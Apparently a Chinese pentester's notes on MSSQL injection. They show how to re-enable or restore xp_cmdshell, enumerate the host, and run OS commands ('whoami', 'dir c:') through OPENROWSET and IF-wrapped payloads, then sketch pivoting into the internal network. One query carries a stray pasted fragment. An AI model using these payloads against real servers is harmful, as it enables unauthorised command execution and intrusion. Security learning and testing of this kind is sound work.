xp_cmdshell

是什么

xp_cmdsell是存储过程之一 存储过程是存储在mssql中预定义的SQL集合。xp_cmdshell就是其中一个脚本。它可以用来执行操作系统的命令。

SELECT ROUTINE_CATALOG,SPECIFIC_SCHEMA,ROUTINE_NAME,ROUTINE_DEFINITION
FROM MASTER.INFORMATION_SCHEMA.ROUTINES
ORDER BY ROUTINE_NAMEcial use, please contact the author

该语句可以查询定义的存储数据有哪些。

关于xp_cmdshell被禁用

开启方法之前已经提到过，但是如果出现执行不成功，可能由于xplog70.dll被删除。解决思路是上传一个该文件并用

;exec sp_addextendedproc 'xp_cmdshell','xplog70.dll'

该语句恢复。

通过xp_cmdshell可以做很多进一步利用，不仅仅是写webshell或者执行简单的whoami。不嫌麻烦也可以用它直接交互。

关于存储过程和扩展

mssql有一些很有趣的存储过程值得利用比如：

  • 获得MS SQL的版本号 //mssql版本

execute master..sp_msgetversion // dbo public

  • 得到硬盘文件信息 //dbo public
execute master..xp_dirtree 'c:' //列出所有c:\文件和目录,子目录

execute master..xp_dirtree 'c:',1 //只列c:\文件夹

execute master..xp_dirtree 'c:',1,1 //列c:\文件夹加文件
  • 列出服务器上所有windows本地组

execute master..xp_enumgroups //dbo

  • 得到当前sql server服务器的计算机名称 //获得计算机名

execute master..xp_getnetname //dbo public

  • 列出服务器域名

xp_ntsec_enumdomains //机器名 //dbo public

  • 停止或者启动某个服务

xp_servicecontrol 'stop','schedule' //schedule是服务得名称 //dbo

  • 一些注册表操作的扩展存储 xp_regaddmultistring

使用 openrowset

它包含访问 OLE DB 数据源中的远程数据所需的所有连接信息。 当访问链接服务器中的表时，这种方法是一种替代方法，并且是一种使用 OLE DB 连接并访问远程数据的一次性的临时方法。 对于较频繁引用 OLE DB 数据源的情况，请改为使用链接服务器。 OPENROWSET 函数可以在查询的 FROM 子句中引用，就好象它是一个表名。 依据 OLE DB 提供程序的功能，还可以将 OPENROWSET 函数引用为 INSERT、UPDATE 或 DELETE 语句的目标表。 尽管查询可能返回多个结果集，但 OPENROWSET 只返回第一个结果集。

以上是来自微软官方的定义。可以理解未这个函数的功能是，通过验证连接一个数据库，并执行语句返回结果。它的语法是

OPENROWSET   
( { 'provider_name' , { 'datasource' ; 'user_id' ; 'password'   
   | 'provider_string' }   
   , {   [ catalog. ] [ schema. ] object   
       | 'query'   
     }   
} )

重要的参数是provider_name。 根据网上文章分享的payload是

select * from openrowset('sqloledb','dsn=locaserver;trusted_connection=yes','set
fmtonly off
exec master..xp_cmdshell ''dir c:''with RESULT SETS((a varchar(max)))')

文章提到了sqlmap的示例payload，

SELECT * FROM OPENROWSET('SQLOLEDB','';'%USER%';'%PASSWORD%','SET FMTONLY OFF %STATEMENT%')
# SELECT * FROM OPENROWSET似乎并不能('SQLNCLI', 'server=(local);trusted_connection=yes','SET FMTONLY OFF SELECT 1;%STATEMENT%')
# SELECT * FROM OPENROWSET('SQLOLEDB','Network=DBMSSOCN;Address=;uid=%USER%;pwd=%PASSWORD%','SET FMTONLY OFF %STATEMENT%')

第二条语句与源payload的比对，发现更改provider_name参数也是可以的

select * from openrowset('SQLNCLI', 'server=(local);trusted_connection=yes','set
fmtonly off
exec master..xp_cmdshell ''dir c:''with RESULT SETS((a varchar(max)))')

这个函数似乎有更深入的用法，但是有点难以挖掘，以以上两个payload为模板进行修改应该就可以了。 但其实该函数已经不怎么实用了。Mssql2005 及其以后，mssql对系统存储过程做了权限控制，Ad Hoc Distributed Queries 组件默认是不被启用的。

  • 开启 Ad Hoc Distributed Queries 组件
exec sp_configure 'show advanced options',1 reconfigure exec sp_configure 'Ad Hoc Distributed Queries',1 reconfigure
  • 关闭 Ad Hoc Distributed Queries 组件
exec sp_configure 'Ad Hoc Distributed Queries',0 reconfigure exec sp_configure 'show advanced options',0 reconfigure

但是实际实验中，需要xp_cmdshell功能开启才能进一步利用。OPENROWSET似乎并不能堆叠查询，倒是可以执行存储过程。总之就是个坑，踩了好久并没什么用。

exec\execute

if 语句的表达式如下，也就是说，我们是可以借助 if 来执行 sql_statement，那么只要你能在你的注入点构造一个 if 出来，不需要环境支持堆叠也可以达到堆叠的效果。

IF Boolean_expression  
    { sql_statement | statement_block }  
[ ELSE  
    { sql_statement | statement_block } ]

一个开启并执行命令的payload

select 1 where 1=1 if 1=1 execute('exec sp_configure ''show advanced options'',
1;reconfigure;exec sp_configure ''xp_cmdshell'', 1;reconfigure;exec xp_cmdshell
''whoami''');

小结

一般情况就用if条件语句吧，openrowset感觉挺坑的，踩了一堆坑想证明自己第一次判断错了，结果踩完了证明了这个函数就是个坑。用IF构造就好了。

站库分离的分类

  • 从web服务器渗透
  • 从数据库服务器渗透

mssql的思路

  1. 获取数据库服务器ip
select host_name();
  1. 获取web服务器ip
select @@servername;

根据两条命令的不同来判断是否是站库分离

  1. 以数据库主机为起点，进行内网渗透。（数据库需要出网）
  2. 或者，通过数据库主机的信息搜集，直接获取web的后台账号密码，对web的后台进行getshell。（该思路居然出现在了酒仙桥六号部队的文章里）

小结
